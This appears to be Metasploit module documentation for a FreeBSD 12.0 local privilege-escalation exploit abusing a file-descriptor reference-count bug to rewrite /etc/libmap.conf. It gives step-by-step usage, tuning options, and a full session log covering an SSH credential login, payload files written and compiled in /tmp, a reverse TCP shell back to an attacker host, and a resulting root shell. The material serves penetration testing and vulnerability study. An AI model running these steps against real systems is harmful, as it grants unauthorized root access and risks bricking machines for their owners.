## Vulnerable Application

FreeBSD 12.0 (and some 11) attempts to handle the case where the receiving process does
not provide a sufficiently large buffer for an incoming control message
containing rights.  In particular, to avoid leaking the corresponding
descriptors into the receiving process' descriptor table, the kernel handles
the truncation case by closing descriptors referenced by the discarded
message.

The code which performs this operation failed to release a reference obtained
on the file corresponding to a received right.  This bug can be used to cause
the reference counter to wrap around and free the file structure.

Exploitation results in write access to `/etc/libmap.conf` where a new dynamic
object is added which includes our payload.

A very detailed write-up is available at [secfault-security.com](https://secfault-security.com/blog/FreeBSD-SA-1902.fd.html)

### Warnings

This exploit is tempermental, often resulting in a system reboot.
Successful exploitation will alter `/etc/libmap.conf`.  If the added library
`libno_ex.so.1.0` is deleted, the system will brick.  Attempts to restore
`/etc/libmap.conf` automatically fail.  Manually reverting the
file from the root prompt should be successful though.

### Warnings 2

Canceling execution of this exploit may case a system reboot,
or cause the system to brick.  If the system reboots, artifacts will
remain on disk and require manual cleanup.

### Warnings 3

This exploit can take between 20 and 60 minutes to exploit, with no feedback.
If the system reboots due to a failed exploitation attempt, no notification is seen
within metasploit until the 60 minute timeout window happens.

## Verification Steps

  1. Start msfconsole
  2. Get a user shell
  3. Do: ```use exploit/freebsd/local/freebsd_fd_ref_count_priv_esc```
  4. Do: ```set session [#]```
  5. Do: ```run```
  6. You should get a root shell between 20 and 60 minutes later.

## Options

  **Forks**

  Set the number of forks to use.  May need to be adjusted based on system RAM.  Default is `3`

  **Threads**

  Set the number of threads per fork.  May need to be adjusted based on system RAM.  Default is `400`

## Scenarios

### FreeBSD 12.0 r341666 with kern.maxfiles 70000

  Exploitation with 70,000 `maxfiles` seems to be 100% with 1gig of ram in a virtual machine.

  ```
resource (freebsd.rb)> use auxiliary/scanner/ssh/ssh_login
resource (freebsd.rb)> set username user
username => user
resource (freebsd.rb)> set password user
password => user
resource (freebsd.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (freebsd.rb)> exploit
[+] 2.2.2.2:22 - Success: 'user:user' ''
[*] Command shell session 1 opened (1.1.1.1:42135 -> 2.2.2.2:22) at 2020-01-09 19:41:17 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (freebsd.rb)> use exploit/freebsd/local/freebsd_fd_ref_count_priv_esc
resource (freebsd.rb)> set verbose true
verbose => true
resource (freebsd.rb)> set session 1
session => 1
resource (freebsd.rb)> set lhost 1.1.1.1
lhost => 1.1.1.1
resource (freebsd.rb)> check
[+] cc is installed
[+] FreeBSD release 12.0-RELEASE rev r341666 with maxfiles 70000 is vulnerable
[+] The target is vulnerable.
resource (freebsd.rb)> exploit
[*] Started reverse TCP handler on 1.1.1.1:4444 
[+] cc is installed
[+] FreeBSD release 12.0-RELEASE rev r341666 with maxfiles 70000 is vulnerable
[*] Stored /etc/libmap.conf in loot.  If session cleanup is unsuccessful, system will brick. Use this to unbrick
[*] Writing '/tmp/.4arU1qp' (230 bytes) ...
[*] Max line length is 131073
[*] Writing 230 bytes in 1 chunks of 656 bytes (octal-encoded), using printf
[+] cc is installed
[*] Live compiling exploit on system...
[*] Writing '/tmp/.BtNP7k.c' (13201 bytes) ...
[*] Max line length is 131073
[*] Writing 13201 bytes in 1 chunks of 47760 bytes (octal-encoded), using printf
[*] Writing '/tmp/.aauI7Ac.c' (231 bytes) ...
[*] Max line length is 131073
[*] Writing 231 bytes in 1 chunks of 836 bytes (octal-encoded), using printf
[*] Writing '/tmp/.yknTtnS8.sh' (92 bytes) ...
[*] Max line length is 131073
[*] Writing 92 bytes in 1 chunks of 335 bytes (octal-encoded), using printf
[*] Launching exploit... May take 50-60 minutes. Start time: 2020-01-09 19:41:39 -0500
[*] [!] write_to_file: Could not stick thread to core: Invalid argument
[*] Command shell session 2 opened (1.1.1.1:4444 -> 2.2.2.2:25496) at 2020-01-09 20:01:02 -0500
[+] Deleted /tmp/.4arU1qp
[+] Deleted /tmp/.BtNP7k
[!] Tried to delete /tmp/.aauI7Ac, unknown result
[+] Deleted /tmp/.yknTtnS8.sh
[*] Performing Cleanup
[-] *************************************************
[+] Automated attempt to not brick the system failed.
[+] Please run `cp /tmp/libmap.conf /etc/libmap.conf`.
[-] *************************************************

id
uid=0(root) gid=0(wheel) groups=0(wheel)
cp /tmp/libmap.conf /etc/libmap.conf
uname -a
FreeBSD freebsd 12.0-RELEASE FreeBSD 12.0-RELEASE r341666 GENERIC  amd64
sysctl kern.maxfiles
kern.maxfiles: 70000
  ```
